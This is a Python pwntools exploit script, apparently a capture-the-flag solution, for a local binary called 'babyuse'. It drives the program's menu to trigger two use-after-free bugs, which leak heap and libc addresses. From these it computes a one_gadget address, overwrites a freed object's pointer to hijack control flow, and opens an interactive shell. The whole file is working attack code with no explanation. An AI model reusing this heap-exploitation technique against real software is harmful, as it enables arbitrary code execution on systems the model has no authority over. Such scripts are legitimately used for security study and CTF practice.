#! /usr/bin/env python

from pwn import *

def buy(length, name):
	p.sendline("1")
	p.recvuntil("2. QBZ95\n")
	p.sendline("1")
	p.recvuntil("name")
	p.sendline(str(length))
	p.recvuntil("Input name:\n")
	p.sendline(name)
	p.recvuntil('7. Exit\n')

def select(index):
	p.sendline("2")
	p.recvuntil("Select a gun")
	p.sendline(str(index))
	p.recvuntil('7. Exit\n')

def list():
	p.sendline("3")
	p.recvline()
	p.recvline("Exit\n")

def rename(index, length, name):
	p.sendline("4")
	p.recvuntil("to rename:\n")
	p.sendline(str(index))
	p.recvuntil("name")
	p.sendline(str(length))
	p.recvuntil("Input name:\n")
	p.sendline(name)
	p.recvuntil('7. Exit\n')
	
def use(finish = True):
	p.sendline("5")
	p.recvuntil("Select gun ")
	data = p.recv(4)
	p.recvuntil("menu\n")
	if finish:
		p.sendline("4")
		p.recvuntil("Exit\n")
		return data

def drop(index):
	p.sendline("6")
	p.recvuntil("to delete:\n")
	p.sendline(str(index))
	p.recvuntil("7. Exit\n")

if __name__ == '__main__':
	p = process("./babyuse")
#	p = process("./babyuse", env={"LD_PRELOAD" : "./libc.so"})

	#First UAF, leak the heap address	
	buy(10, "AAAABBBB") #Index 0
	rename(0, 8, "CCCCDDDD")
	select(0)
	drop(0)
	heapleak = u32(use())
	print "Heap Leak: " + hex(heapleak)
	
	#Secend UAF, leak the libc
	buy(256, "AAAABBBB") #Index 0
	buy(256, "CCCCDDDD") #Index 1
	select(0)
	drop(0)
	libcleak = u32(use())
	libcbase = libcleak - 0x1b27b0
	onegaddr = libcbase + 0x3ac69
	heapdest = heapleak + 0x2c
	print "Libc Leak: " + hex(libcleak)
	print "Libc Base: " + hex(libcbase)
	print "One_gadget " + hex(onegaddr)

	payload = p32(onegaddr) + p32(onegaddr) + p32(onegaddr) + p32(onegaddr) + p32(onegaddr)
	buy(32, payload) #Index 0
	buy(32, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA") #Index 2
	buy(32, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBB") #Index 3
	
	select(2)
	drop(0)
	drop(2)
	drop(3)


	payload = p32(heapdest) + p32(heapdest)
	buy(16, payload)
	use(False)
	p.interactive()

